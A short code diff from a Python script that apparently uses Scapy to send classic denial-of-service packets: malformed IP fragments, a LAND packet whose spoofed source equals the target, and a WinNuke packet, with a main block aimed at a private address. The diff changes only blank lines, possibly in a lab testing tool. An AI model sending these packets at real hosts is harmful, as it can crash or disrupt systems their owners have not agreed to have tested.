@@ -182,7 +182,6 @@ def malfored_fragment_send(target_ip :str, count : int = 1) -> str:
         for frag in fragments:
             send(frag)
 
-
 def land_fragment_send(target_ip : str, count : int = 1) :
     packet = IP(dst=target_ip, src=target_ip) / TCP(dport=443, sport=random.randint(1024,65535), flags='S',seq=1234)
     for i in range(count):
@@ -195,6 +194,8 @@ def winnuke_fragment_send(target_ip : str, count : int = 1) :
     for i in range(count):
         send(packet)
     return
+
+
 
 if __name__ == '__main__':
     land_fragment_send('10.113.53.206', count=2)
